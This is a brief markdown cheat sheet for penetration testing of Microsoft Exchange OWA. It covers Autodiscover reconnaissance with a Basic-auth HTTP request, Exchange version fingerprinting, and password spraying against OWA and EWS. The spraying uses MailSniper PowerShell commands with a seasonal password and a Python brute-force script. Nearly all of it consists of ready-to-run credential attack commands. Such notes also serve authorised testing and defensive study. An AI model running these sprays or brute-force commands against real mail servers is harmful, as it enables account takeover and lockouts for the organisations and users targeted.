# Exchange OWA Penetration Test

### 1. Recon
- Autodiscover
```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: mail.domain.tld
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.10730; Pro)
Authorization: Basic base64(domain\user:password)
Content-Length: 341
Content-Type: text/xml

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>myemail@domain.com</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```
- Version
```
python3 get-exchange-version.py https://mail.domain.tld
```

### 2. Password Spray
- PasswordSprayOWA
- PasswordSprayEWS
```
Import-Module MailSniper.ps1
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
```
```
python3 bruteforce/bruteforce.py -t https://mail.domain.com/EWS/Exchange.asmx -U users.txt -p TestPassword
```
